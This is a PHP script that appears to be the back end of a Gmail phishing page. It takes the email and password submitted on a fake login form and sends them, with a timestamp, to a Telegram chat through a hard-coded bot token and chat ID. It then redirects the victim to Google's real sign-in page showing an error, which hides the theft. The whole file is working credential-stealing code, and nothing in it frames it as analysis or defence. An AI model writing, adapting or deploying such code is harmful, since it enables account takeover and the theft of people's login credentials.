<?php
$botToken = "8699536581:AAFZXyZP1WcxGu5TZ6qadbalInHpGwKcpZ0";
$chatId   = "8541234140";

$email    = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($email) || empty($password)) {
    header('Location: index.html?error=1');
    exit;
}

$message = "🔐 *GMAIL LOGIN*\n📧 *Email:* $email\n🔑 *Password:* $password\n🕒 *Waktu:* " . date('Y-m-d H:i:s') . " WIB";

$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
file_get_contents($url, false, $context);

header('Location: https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&error=1');
exit;
?>
